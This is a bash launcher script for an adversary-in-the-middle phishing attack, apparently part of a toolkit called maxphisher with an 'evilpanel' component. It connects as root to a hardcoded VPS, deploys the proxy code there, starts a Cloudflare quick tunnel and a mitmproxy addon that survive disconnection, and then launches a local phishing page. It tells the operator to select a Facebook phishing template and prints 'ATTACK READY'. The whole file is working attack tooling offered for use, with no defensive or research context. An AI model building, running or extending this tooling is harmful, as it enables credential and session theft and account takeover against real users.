#!/bin/bash
# scripts/start_tunneled_attack.sh
# Run from LOCAL machine - orchestrates VPS and local components
#
# FIXED VERSION v2.1:
# - Uses nohup for VPS processes (survive SSH disconnect)
# - Added deployment check
# - Proper background process handling
# - Default VPS configuration

set -e

# ================== CONFIGURATION ==================
# Set these via environment or edit defaults
VPS_HOST="${VPS_HOST:-206.189.92.6}"
VPS_USER="${VPS_USER:-root}"
VPS_SSH_KEY="${VPS_SSH_KEY:-$HOME/.ssh/id_ed25519_maxphisher}"
EVILPANEL_DIR="/opt/evilpanel"
LOCAL_MAXPHISHER_DIR="$(cd "$(dirname "$0")/.." && pwd)"

# SSH options
SSH_OPTS="-o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=yes"
if [ -n "$VPS_SSH_KEY" ] && [ -f "$VPS_SSH_KEY" ]; then
    SSH_OPTS="$SSH_OPTS -i $VPS_SSH_KEY"
fi

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ================== FUNCTIONS ==================
check_ssh() {
    echo -e "${YELLOW}[*] Testing SSH connection to $VPS_USER@$VPS_HOST...${NC}"
    if ! ssh $SSH_OPTS $VPS_USER@$VPS_HOST "echo 'SSH OK'" 2>/dev/null; then
        echo -e "${RED}[!] Cannot connect to VPS via SSH${NC}"
        echo "    Check: VPS_HOST, VPS_USER, VPS_SSH_KEY"
        echo "    Current: $VPS_USER@$VPS_HOST"
        echo ""
        echo "    Set environment variables:"
        echo "    export VPS_HOST='your-vps-ip'"
        echo "    export VPS_USER='root'"
        echo "    export VPS_SSH_KEY='~/.ssh/your_key'"
        exit 1
    fi
    echo -e "${GREEN}[+] SSH connection OK${NC}"
}

check_vps_files() {
    echo -e "${YELLOW}[*] Checking VPS files...${NC}"
    
    # Check if key files exist on VPS
    MISSING_FILES=$(ssh $SSH_OPTS $VPS_USER@$VPS_HOST "
        MISSING=''
        [ ! -f /opt/evilpanel/run_tunnel_mode.py ] && MISSING=\"\$MISSING run_tunnel_mode.py\"
        [ ! -f /opt/evilpanel/core/mitmproxy_addon.py ] && MISSING=\"\$MISSING core/mitmproxy_addon.py\"
        echo \$MISSING
    " 2>/dev/null)
    
    if [ -n "$MISSING_FILES" ]; then
        echo -e "${RED}[!] Missing files on VPS:$MISSING_FILES${NC}"
        echo ""
        echo -e "${YELLOW}[*] Deploying files to VPS...${NC}"
        deploy_to_vps
    else
        echo -e "${GREEN}[+] VPS files OK${NC}"
    fi
}

deploy_to_vps() {
    echo -e "${YELLOW}[*] Syncing evilpanel to VPS...${NC}"
    
    # Create directory on VPS
    ssh $SSH_OPTS $VPS_USER@$VPS_HOST "mkdir -p /opt/evilpanel/core /opt/evilpanel/data" 2>/dev/null
    
    # Sync files
    rsync -avz --exclude='__pycache__' --exclude='*.pyc' --exclude='venv' \
        -e "ssh $SSH_OPTS" \
        "$LOCAL_MAXPHISHER_DIR/evilpanel/" \
        "$VPS_USER@$VPS_HOST:/opt/evilpanel/" 2>/dev/null
    
    # Make scripts executable
    ssh $SSH_OPTS $VPS_USER@$VPS_HOST "chmod +x /opt/evilpanel/*.sh /opt/evilpanel/*.py" 2>/dev/null
    
    echo -e "${GREEN}[+] Deployment complete${NC}"
}

cleanup_vps() {
    echo -e "${YELLOW}[*] Cleaning up VPS processes...${NC}"
    ssh $SSH_OPTS $VPS_USER@$VPS_HOST "
        pkill -f 'mitmproxy_addon' 2>/dev/null || true
        pkill -f 'cloudflared.*8443' 2>/dev/null || true
        rm -f /tmp/cloudflared.log /tmp/mitmproxy.log /tmp/tunnel_url.txt 2>/dev/null || true
    " 2>/dev/null || true
}

# ================== MAIN ==================
echo -e "${CYAN}"
echo "╔════════════════════════════════════════════════════════════════╗"
echo "║     TUNNELED AiTM ATTACK LAUNCHER v2.1                         ║"
echo "║     Landing Page + AiTM Proxy via Cloudflare Tunnels           ║"
echo "╠════════════════════════════════════════════════════════════════╣"
echo "║  FIXED: nohup for VPS processes + auto deployment              ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${CYAN}Configuration:${NC}"
echo "  VPS_HOST: $VPS_HOST"
echo "  VPS_USER: $VPS_USER"
echo "  SSH_KEY:  $VPS_SSH_KEY"
echo ""

# Test SSH
check_ssh

# Check/deploy VPS files
check_vps_files

# Cleanup any existing processes
cleanup_vps
sleep 2

# ==================== STEP 1: VPS - START TUNNEL ====================
echo ""
echo -e "${YELLOW}[STEP 1/4] Starting cloudflared + mitmproxy on VPS...${NC}"

# SSH to VPS - start cloudflared FIRST, get URL, THEN start mitmproxy
# Using nohup so processes survive SSH disconnect
AITM_URL=$(ssh $SSH_OPTS $VPS_USER@$VPS_HOST 'bash -s' << 'REMOTE_SCRIPT'
    cd /opt/evilpanel
    
    # Cleanup
    pkill -f "mitmproxy_addon" 2>/dev/null || true
    pkill -f "cloudflared.*8443" 2>/dev/null || true
    sleep 2
    
    # ===== STEP A: Start cloudflared FIRST with nohup =====
    # It will fail to connect (mitmproxy not running yet) but WILL generate URL
    nohup cloudflared tunnel --url http://127.0.0.1:8443 > /tmp/cloudflared.log 2>&1 &
    CF_PID=$!
    disown $CF_PID 2>/dev/null || true
    
    # Save PID for later management
    echo $CF_PID > /tmp/cloudflared.pid
    
    # Wait for URL (cloudflared generates it even without backend)
    TUNNEL_URL=""
    for i in {1..30}; do
        TUNNEL_URL=$(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cloudflared.log 2>/dev/null | head -1)
        if [ -n "$TUNNEL_URL" ]; then
            break
        fi
        sleep 1
    done
    
    if [ -z "$TUNNEL_URL" ]; then
        echo "TUNNEL_FAILED:NO_URL"
        cat /tmp/cloudflared.log >&2
        exit 1
    fi
    
    # Save URL to file for later use
    echo "$TUNNEL_URL" > /tmp/tunnel_url.txt
    
    # Extract domain
    TUNNEL_DOMAIN=$(echo "$TUNNEL_URL" | sed 's|https://||')
    
    # ===== STEP B: NOW start mitmproxy with correct domain using nohup =====
    export EVILPANEL_DOMAIN="$TUNNEL_DOMAIN"
    export EVILPANEL_DATA="/opt/evilpanel/data"
    export EVILPANEL_DEBUG="true"
    
    # Start mitmproxy with nohup (will now have correct domain)
    nohup python3 run_tunnel_mode.py > /tmp/mitmproxy.log 2>&1 &
    MP_PID=$!
    disown $MP_PID 2>/dev/null || true
    
    # Save PID
    echo $MP_PID > /tmp/mitmproxy.pid
    
    # Wait for mitmproxy to start
    for i in {1..20}; do
        if curl -s -o /dev/null http://127.0.0.1:8443 2>/dev/null; then
            break
        fi
        # Check if mitmproxy crashed
        if ! ps -p $MP_PID > /dev/null 2>&1; then
            echo "TUNNEL_FAILED:MITMPROXY_CRASHED"
            cat /tmp/mitmproxy.log >&2
            exit 1
        fi
        sleep 1
    done
    
    # Verify both are running
    if ! ps -p $CF_PID > /dev/null 2>&1; then
        echo "TUNNEL_FAILED:CLOUDFLARED_DIED"
        exit 1
    fi
    if ! ps -p $MP_PID > /dev/null 2>&1; then
        echo "TUNNEL_FAILED:MITMPROXY_DIED"
        exit 1
    fi
    
    # Success - output URL
    echo "$TUNNEL_URL"
REMOTE_SCRIPT
)

# Check result
if [[ "$AITM_URL" == TUNNEL_FAILED* ]]; then
    echo -e "${RED}[!] Failed to start VPS tunnel: $AITM_URL${NC}"
    echo "    Check VPS manually: ssh $VPS_USER@$VPS_HOST"
    echo "    Logs: /tmp/cloudflared.log, /tmp/mitmproxy.log"
    exit 1
fi

if [ -z "$AITM_URL" ]; then
    echo -e "${RED}[!] Failed to get AiTM tunnel URL (empty response)${NC}"
    exit 1
fi

echo -e "${GREEN}[+] AiTM Tunnel URL: $AITM_URL${NC}"

# ==================== STEP 2: SET LOCAL ENVIRONMENT ====================
echo ""
echo -e "${YELLOW}[STEP 2/4] Setting EVILPANEL_URL environment variable...${NC}"
export EVILPANEL_URL="$AITM_URL"
echo -e "${GREEN}[+] EVILPANEL_URL=$EVILPANEL_URL${NC}"

# ==================== STEP 3: VERIFY VPS ====================
echo ""
echo -e "${YELLOW}[STEP 3/4] Verifying VPS tunnel is working...${NC}"

# Test the tunnel endpoint
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$AITM_URL" 2>/dev/null || echo "000")
if [ "$HTTP_CODE" == "000" ]; then
    echo -e "${YELLOW}[!] Warning: Could not reach tunnel URL (might be normal during startup)${NC}"
elif [ "$HTTP_CODE" == "502" ] || [ "$HTTP_CODE" == "503" ]; then
    echo -e "${YELLOW}[!] Warning: Tunnel returned $HTTP_CODE (backend might still be starting)${NC}"
else
    echo -e "${GREEN}[+] Tunnel responding with HTTP $HTTP_CODE${NC}"
fi

# ==================== STEP 4: START LOCAL MAXPHISHER ====================
echo ""
echo -e "${YELLOW}[STEP 4/4] Starting local maxphisher...${NC}"
echo ""

cd "$LOCAL_MAXPHISHER_DIR"

echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  ${GREEN}ATTACK READY${CYAN}                                                  ║${NC}"
echo -e "${CYAN}╠════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║                                                                ║${NC}"
echo -e "${CYAN}║  AiTM URL: ${GREEN}$AITM_URL${NC}"
echo -e "${CYAN}║                                                                ║${NC}"
echo -e "${CYAN}║  ${YELLOW}Starting maxphisher to get landing page URL...${NC}"
echo -e "${CYAN}║                                                                ║${NC}"
echo -e "${CYAN}║  ${YELLOW}NOTE: Select 'facebook_evilpanel-maxphisher' template${NC}"
echo -e "${CYAN}║                                                                ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Start maxphisher with EVILPANEL_URL already set
exec python3 core/maxphisher2.py
